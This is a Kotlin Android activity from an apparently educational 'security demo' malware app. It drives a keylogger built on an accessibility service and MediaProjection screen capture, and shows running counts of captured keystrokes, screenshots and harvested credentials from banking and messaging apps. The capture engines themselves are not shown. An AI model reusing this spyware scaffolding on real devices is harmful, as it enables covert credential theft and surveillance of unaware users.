package com.securitydemo.malware.activities

import android.app.AlertDialog
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.securitydemo.malware.R
import com.securitydemo.malware.services.MaliciousAccessibilityService
import com.securitydemo.malware.utils.KeyloggerEngine
import com.securitydemo.malware.utils.ScreenCaptureEngine
import kotlinx.coroutines.*
import java.io.File

/**
 * SECURITY DEMO: Keylogger and Screen Capture Activity
 * 
 * This activity demonstrates the most invasive malware capabilities:
 * - Complete keystroke logging and password capture
 * - Continuous screen recording and screenshot capture
 * - Real-time monitoring of all user interactions
 * - Credential harvesting from login forms
 * - Sensitive content detection and extraction
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows comprehensive surveillance techniques
 */
class KeyloggerActivity : AppCompatActivity() {

    private lateinit var statusTextView: TextView
    private lateinit var startKeyloggerButton: Button
    private lateinit var startScreenCaptureButton: Button
    private lateinit var viewCapturedDataButton: Button
    private lateinit var analysisButton: Button

    private lateinit var keyloggerEngine: KeyloggerEngine
    private lateinit var screenCaptureEngine: ScreenCaptureEngine
    
    private val activityScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var isKeyloggerActive = false
    private var isScreenCaptureActive = false

    companion object {
        private const val SCREEN_CAPTURE_REQUEST_CODE = 3001
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_keylogger)

        initializeViews()
        initializeEngines()
        
        showSurveillanceWarning()
        checkSurveillancePermissions()
    }

    private fun initializeViews() {
        statusTextView = findViewById(R.id.tv_keylogger_status)
        startKeyloggerButton = findViewById(R.id.btn_start_keylogger)
        startScreenCaptureButton = findViewById(R.id.btn_start_screen_capture)
        viewCapturedDataButton = findViewById(R.id.btn_view_captured_data)
        analysisButton = findViewById(R.id.btn_surveillance_analysis)

        startKeyloggerButton.setOnClickListener { toggleKeylogger() }
        startScreenCaptureButton.setOnClickListener { toggleScreenCapture() }
        viewCapturedDataButton.setOnClickListener { showCapturedData() }
        analysisButton.setOnClickListener { showSurveillanceAnalysis() }
    }

    private fun initializeEngines() {
        keyloggerEngine = KeyloggerEngine(this)
        screenCaptureEngine = ScreenCaptureEngine(this)
    }

    private fun showSurveillanceWarning() {
        AlertDialog.Builder(this)
            .setTitle("âš ï¸ Advanced Surveillance Demo")
            .setMessage("""
                This demonstrates the most invasive malware capabilities:
                
                ðŸ” KEYLOGGING CAPABILITIES:
                â€¢ Capture ALL keyboard input
                â€¢ Steal passwords and PINs
                â€¢ Record private messages
                â€¢ Monitor search queries
                â€¢ Extract credit card numbers
                
                ðŸ“¸ SCREEN SURVEILLANCE:
                â€¢ Continuous screenshot capture
                â€¢ Screen recording functionality
                â€¢ Sensitive content detection
                â€¢ Visual credential harvesting
                â€¢ Real-time visual monitoring
                
                ðŸŽ¯ ATTACK OBJECTIVES:
                â€¢ Complete user surveillance
                â€¢ Credential theft and fraud
                â€¢ Privacy violation
                â€¢ Blackmail material collection
                
                âš ï¸ This is for educational purposes only!
            """.trimIndent())
            .setPositiveButton("Understood", null)
            .show()
    }

    private fun checkSurveillancePermissions() {
        updateStatus("ðŸ” SURVEILLANCE SYSTEM ANALYSIS\n\n")
        
        val requirements = StringBuilder()
        requirements.append("=== SURVEILLANCE REQUIREMENTS ===\n\n")

        // Check accessibility service
        val accessibilityEnabled = isAccessibilityServiceEnabled()
        requirements.append("ðŸ¤– Accessibility Service: ${if (accessibilityEnabled) "âœ“ ACTIVE" else "âœ— REQUIRED"}\n")

        // Check screen capture permission
        val canCaptureScreen = canCaptureScreen()
        requirements.append("ðŸ“± Screen Capture: ${if (canCaptureScreen) "âœ“ AVAILABLE" else "âœ— REQUIRED"}\n")

        // Check overlay permission
        val canDrawOverlays = Settings.canDrawOverlays(this)
        requirements.append("ðŸ”„ System Overlay: ${if (canDrawOverlays) "âœ“ GRANTED" else "âœ— REQUIRED"}\n\n")

        if (accessibilityEnabled) {
            requirements.append("ðŸš¨ CRITICAL: Full surveillance capabilities active!\n")
            requirements.append("â€¢ Every keystroke can be captured\n")
            requirements.append("â€¢ All screen content can be monitored\n")
            requirements.append("â€¢ Complete user activity surveillance\n\n")
            
            startKeyloggerButton.isEnabled = true
            startScreenCaptureButton.isEnabled = true
        } else {
            requirements.append("â„¹ï¸ Enable accessibility service for full surveillance\n\n")
        }

        // Show protection measures
        requirements.append("ðŸ›¡ï¸ PROTECTION MEASURES:\n")
        requirements.append("â€¢ Never enable accessibility for unknown apps\n")
        requirements.append("â€¢ Regularly audit enabled accessibility services\n")
        requirements.append("â€¢ Monitor for suspicious screen recording apps\n")
        requirements.append("â€¢ Use secure keyboards for passwords\n")
        requirements.append("â€¢ Check for overlay attacks on login screens\n")

        updateStatus(requirements.toString())

        if (!accessibilityEnabled) {
            showAccessibilityDialog()
        }
    }

    private fun showAccessibilityDialog() {
        AlertDialog.Builder(this)
            .setTitle("Surveillance Permission Required")
            .setMessage("To demonstrate keylogging and screen capture, this app needs accessibility permissions. This is exactly what spyware requests to monitor everything you do.")
            .setPositiveButton("Enable Service") { _, _ ->
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun toggleKeylogger() {
        if (!isAccessibilityServiceEnabled()) {
            Toast.makeText(this, "Accessibility service required for keylogging", Toast.LENGTH_LONG).show()
            return
        }

        if (isKeyloggerActive) {
            stopKeylogger()
        } else {
            startKeylogger()
        }
    }

    private fun startKeylogger() {
        updateStatus("ðŸš€ STARTING KEYLOGGER ATTACK...\n\n")
        
        activityScope.launch {
            try {
                updateStatus("Phase 1: Initializing keystroke capture engine...")
                delay(1000)

                val result = keyloggerEngine.startKeylogging()
                
                if (result) {
                    isKeyloggerActive = true
                    startKeyloggerButton.text = "Stop Keylogger"
                    
                    updateStatus("âœ… KEYLOGGER ACTIVE!")
                    updateStatus("ðŸ” Monitoring ALL keyboard input...")
                    updateStatus("ðŸŽ¯ Target applications: Banking, Messaging, Email")
                    updateStatus("ðŸ’€ Passwords, PINs, messages being captured")
                    updateStatus("\nðŸš¨ COMPLETE KEYSTROKE SURVEILLANCE ACTIVE!")
                    
                    showKeyloggerSuccess()
                    
                    // Start monitoring captured data
                    startDataMonitoring()
                    
                } else {
                    updateStatus("âŒ Keylogger activation failed")
                }

            } catch (e: Exception) {
                updateStatus("ðŸ’¥ Keylogger error: ${e.message}")
            }
        }
    }

    private fun stopKeylogger() {
        keyloggerEngine.stopKeylogging()
        isKeyloggerActive = false
        startKeyloggerButton.text = "Start Keylogger"
        updateStatus("â¹ï¸ Keylogger stopped\n")
    }

    private fun toggleScreenCapture() {
        if (isScreenCaptureActive) {
            stopScreenCapture()
        } else {
            requestScreenCapturePermission()
        }
    }

    private fun requestScreenCapturePermission() {
        val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val intent = mediaProjectionManager.createScreenCaptureIntent()
        startActivityForResult(intent, SCREEN_CAPTURE_REQUEST_CODE)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                startScreenCapture(data)
            } else {
                updateStatus("âŒ Screen capture permission denied\n")
            }
        }
    }

    private fun startScreenCapture(permissionData: Intent) {
        updateStatus("ðŸ“¸ STARTING SCREEN SURVEILLANCE...\n\n")
        
        activityScope.launch {
            try {
                updateStatus("Phase 1: Establishing screen capture service...")
                delay(1000)

                val result = screenCaptureEngine.startScreenCapture(permissionData)
                
                if (result) {
                    isScreenCaptureActive = true
                    startScreenCaptureButton.text = "Stop Screen Capture"
                    
                    updateStatus("âœ… SCREEN SURVEILLANCE ACTIVE!")
                    updateStatus("ðŸ“± Capturing screenshots every 5 seconds...")
                    updateStatus("ðŸŽ¯ Monitoring: Login screens, Banking apps, Messages")
                    updateStatus("ðŸ’€ Sensitive visual content being harvested")
                    updateStatus("\nðŸš¨ COMPLETE VISUAL SURVEILLANCE ACTIVE!")
                    
                    showScreenCaptureSuccess()
                    
                } else {
                    updateStatus("âŒ Screen capture activation failed")
                }

            } catch (e: Exception) {
                updateStatus("ðŸ’¥ Screen capture error: ${e.message}")
            }
        }
    }

    private fun stopScreenCapture() {
        screenCaptureEngine.stopScreenCapture()
        isScreenCaptureActive = false
        startScreenCaptureButton.text = "Start Screen Capture"
        updateStatus("â¹ï¸ Screen capture stopped\n")
    }

    private fun startDataMonitoring() {
        activityScope.launch {
            while (isKeyloggerActive || isScreenCaptureActive) {
                try {
                    delay(10000) // Check every 10 seconds
                    
                    val keystrokeCount = keyloggerEngine.getKeystrokeCount()
                    val screenshotCount = screenCaptureEngine.getScreenshotCount()
                    val credentialsFound = keyloggerEngine.getCredentialsFound()
                    
                    updateStatus("ðŸ“Š LIVE SURVEILLANCE STATUS:")
                    updateStatus("â€¢ Keystrokes captured: $keystrokeCount")
                    updateStatus("â€¢ Screenshots taken: $screenshotCount") 
                    updateStatus("â€¢ Credentials harvested: $credentialsFound")
                    updateStatus("â€¢ Privacy violations: CONTINUOUS\n")
                    
                } catch (e: Exception) {
                    // Silently continue monitoring
                }
            }
        }
    }

    private fun showCapturedData() {
        activityScope.launch {
            val report = generateCaptureReport()
            
            AlertDialog.Builder(this@KeyloggerActivity)
                .setTitle("ðŸ“Š Captured Surveillance Data")
                .setMessage(report)
                .setPositiveButton("Close", null)
                .show()
        }
    }

    private fun showSurveillanceAnalysis() {
        activityScope.launch {
            val analysis = generateSurveillanceAnalysis()
            
            AlertDialog.Builder(this@KeyloggerActivity)
                .setTitle("ðŸ” Surveillance Analysis Report")
                .setMessage(analysis)
                .setPositiveButton("Close", null)
                .show()
        }
    }

    private fun generateCaptureReport(): String {
        val report = StringBuilder()
        report.append("=== CAPTURED SURVEILLANCE DATA ===\n\n")
        
        try {
            // Keylogger data
            val keylogData = keyloggerEngine.generateReport()
            report.append("ðŸ” KEYLOGGER REPORT:\n")
            report.append(keylogData)
            report.append("\n\n")
            
            // Screen capture data
            val screenData = screenCaptureEngine.generateReport()
            report.append("ðŸ“¸ SCREEN CAPTURE REPORT:\n")
            report.append(screenData)
            report.append("\n\n")
            
            // Combined analysis
            report.append("ðŸŽ¯ COMBINED SURVEILLANCE IMPACT:\n")
            report.append("â€¢ Complete user behavior profiling\n")
            report.append("â€¢ Comprehensive credential harvesting\n")
            report.append("â€¢ Visual and textual privacy violation\n")
            report.append("â€¢ Real-time activity monitoring\n")
            report.append("â€¢ Identity theft material collection\n")
            
        } catch (e: Exception) {
            report.append("Error generating report: ${e.message}")
        }
        
        return report.toString()
    }

    private fun generateSurveillanceAnalysis(): String {
        return try {
            val analysis = StringBuilder()
            analysis.append("=== SURVEILLANCE SYSTEM ANALYSIS ===\n\n")
            
            analysis.append("ðŸ“Š SURVEILLANCE CAPABILITIES:\n")
            analysis.append("â€¢ Keylogger: ${if (isKeyloggerActive) "ACTIVE" else "INACTIVE"}\n")
            analysis.append("â€¢ Screen capture: ${if (isScreenCaptureActive) "ACTIVE" else "INACTIVE"}\n")
            analysis.append("â€¢ Real-time monitoring: ${if (isKeyloggerActive || isScreenCaptureActive) "ENABLED" else "DISABLED"}\n\n")
            
            analysis.append("ðŸŽ¯ ATTACK EFFECTIVENESS:\n")
            when {
                isKeyloggerActive && isScreenCaptureActive -> {
                    analysis.append("ðŸš¨ MAXIMUM SURVEILLANCE: Complete user monitoring\n")
                    analysis.append("â€¢ Every action captured and recorded\n")
                    analysis.append("â€¢ Visual and textual content harvested\n")
                    analysis.append("â€¢ Complete privacy violation achieved\n")
                }
                isKeyloggerActive -> {
                    analysis.append("âš ï¸ HIGH SURVEILLANCE: Text input monitoring\n")
                    analysis.append("â€¢ All typing captured including passwords\n")
                    analysis.append("â€¢ Credential theft in progress\n")
                }
                isScreenCaptureActive -> {
                    analysis.append("âš ï¸ MEDIUM SURVEILLANCE: Visual monitoring\n")
                    analysis.append("â€¢ Screen content being captured\n")
                    analysis.append("â€¢ Visual credential harvesting active\n")
                }
                else -> {
                    analysis.append("âœ“ NO SURVEILLANCE: System protected\n")
                }
            }
            
            analysis.append("\nðŸ’° ESTIMATED ATTACK VALUE:\n")
            val capturedData = keyloggerEngine.getKeystrokeCount() + screenCaptureEngine.getScreenshotCount()
            analysis.append("â€¢ Data points captured: $capturedData\n")
            analysis.append("â€¢ Estimated dark web value: $${capturedData * 0.25}\n")
            analysis.append("â€¢ Identity theft risk: ${if (capturedData > 100) "CRITICAL" else if (capturedData > 50) "HIGH" else "MEDIUM"}\n")
            
            analysis.toString()
            
        } catch (e: Exception) {
            "Error generating analysis: ${e.message}"
        }
    }

    private fun showKeyloggerSuccess() {
        AlertDialog.Builder(this)
            .setTitle("ðŸŽ¯ KEYLOGGER ACTIVATED")
            .setMessage("""
                Keystroke surveillance is now active!
                
                CAPTURING:
                â€¢ Every character typed
                â€¢ All passwords and PINs
                â€¢ Private messages and emails
                â€¢ Search queries and URLs
                â€¢ Credit card numbers
                â€¢ Security questions and answers
                
                The user has no indication that
                everything they type is being
                recorded and transmitted.
            """.trimIndent())
            .setPositiveButton("Understood", null)
            .show()
    }

    private fun showScreenCaptureSuccess() {
        AlertDialog.Builder(this)
            .setTitle("ðŸ“¸ SCREEN SURVEILLANCE ACTIVE")
            .setMessage("""
                Visual monitoring is now operational!
                
                CAPTURING:
                â€¢ Continuous screenshots
                â€¢ Login screen credentials
                â€¢ Banking application content
                â€¢ Private conversation screenshots
                â€¢ Document and photo viewing
                â€¢ Sensitive visual information
                
                Every screen the user views is being
                recorded and can be analyzed for
                sensitive information.
            """.trimIndent())
            .setPositiveButton("Understood", null)
            .show()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return enabledServices?.contains("${packageName}/${MaliciousAccessibilityService::class.java.name}") == true
    }

    private fun canCaptureScreen(): Boolean {
        // In a real implementation, this would check for media projection permissions
        return true
    }

    private fun updateStatus(message: String) {
        statusTextView.text = "${statusTextView.text}$message\n"
        statusTextView.post {
            val parent = statusTextView.parent as android.widget.ScrollView
            parent.fullScroll(android.widget.ScrollView.FOCUS_DOWN)
        }
    }

    override fun onResume() {
        super.onResume()
        // Update status when returning to activity
        activityScope.launch {
            delay(500)
            checkSurveillancePermissions()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        activityScope.cancel()
        
        // Stop surveillance if active
        if (isKeyloggerActive) {
            stopKeylogger()
        }
        if (isScreenCaptureActive) {
            stopScreenCapture()
        }
    }
}
